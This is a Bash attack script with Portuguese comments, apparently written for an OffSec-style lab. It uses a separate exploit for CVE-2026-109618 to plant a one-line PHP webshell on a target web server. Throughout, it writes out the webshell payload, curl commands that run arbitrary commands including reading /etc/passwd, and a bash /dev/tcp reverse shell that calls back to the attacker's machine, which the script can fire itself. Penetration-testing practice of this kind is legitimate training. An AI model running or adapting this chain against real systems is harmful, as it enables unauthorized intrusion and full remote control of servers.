#!/bin/bash
# run_shell.sh — Planta webshell via CVE-2026-109618 e abre reverse shell
#
# Uso:
#   Terminal 1 (listener):  nc -lvnp 4444
#   Terminal 2 (exploit):   ./run_shell.sh

set -u

HOST="${1:-${IP:-192.168.107.10}}"
PORT="${2:-80}"
BASE="http://$HOST:$PORT"
LPORT=4444

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

# Detecta IP do Kali (tun0 = VPN OffSec)
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        echo "KALI_IP")

echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  CVE-2026-109618 → Webshell → Reverse Shell${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo ""
echo "  Target:   $HOST:$PORT"
echo "  Callback: $LHOST:$LPORT"
echo ""

# ─── STEP 1: Verificar se webshell já existe ───
echo -e "${YELLOW}[1/3]${NC} Verificando se webshell já existe..."
WS_CHECK=$(curl -s --max-time 5 "$BASE/s.php?c=id" 2>/dev/null)
if echo "$WS_CHECK" | grep -q "uid="; then
    echo -e "${GREEN}[OK]${NC} Webshell já está ativo!"
    echo "  $WS_CHECK"
else
    # ─── STEP 2: Plantar webshell via exploit ───
    echo -e "${YELLOW}[2/3]${NC} Plantando webshell via exploit-orig.py..."
    echo "  Comando: echo '<?=\`\$_GET[c]\`;'>/var/www/html/s.php (41 bytes)"
    echo ""

    for ATTEMPT in $(seq 1 10); do
        echo -e "${YELLOW}  Tentativa $ATTEMPT/10...${NC}"

        python3 exploit-orig.py \
          --host "$HOST" \
          --port "$PORT" \
          --rce "echo '<?=\`\$_GET[c]\`;'>/var/www/html/s.php"

        sleep 2

        WS_CHECK=$(curl -s --max-time 5 "$BASE/s.php?c=id" 2>/dev/null)
        if echo "$WS_CHECK" | grep -q "uid="; then
            echo -e "${GREEN}[OK]${NC} Webshell plantado!"
            echo "  $WS_CHECK"
            break
        fi
    done

    if ! echo "$WS_CHECK" | grep -q "uid="; then
        echo -e "${RED}[FAIL]${NC} Não consegui plantar o webshell."
        exit 1
    fi
fi

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
echo -e "${GREEN}  WEBSHELL ATIVO: $BASE/s.php?c=COMANDO${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
echo ""
echo "  Exemplos:"
echo "    curl '$BASE/s.php?c=id'"
echo "    curl '$BASE/s.php?c=whoami'"
echo "    curl '$BASE/s.php?c=cat+/etc/passwd'"
echo "    curl '$BASE/s.php?c=ls+-la+/var/www/'"
echo ""

# ─── STEP 3: Reverse shell ───
echo -e "${YELLOW}[3/3]${NC} Para abrir reverse shell:"
echo ""
echo -e "${CYAN}  Terminal 1 (listener):${NC}"
echo "    nc -lvnp $LPORT"
echo ""
echo -e "${CYAN}  Terminal 2 (trigger):${NC}"
echo "    curl '$BASE/s.php?c=bash+-c+bash%20-i%20%3E%26%20/dev/tcp/$LHOST/$LPORT%200%3E%261'"
echo ""

read -p "Abrir reverse shell agora? (Certifique-se de que nc -lvnp $LPORT está rodando!) [s/N] " RESP
if [[ "$RESP" =~ ^[sS]$ ]]; then
    echo "[*] Disparando reverse shell para $LHOST:$LPORT..."
    curl -s --max-time 5 "$BASE/s.php?c=bash+-c+bash%20-i%20%3E%26%20/dev/tcp/$LHOST/$LPORT%200%3E%261" &
    echo -e "${GREEN}[*] Verifique o terminal do netcat!${NC}"
fi
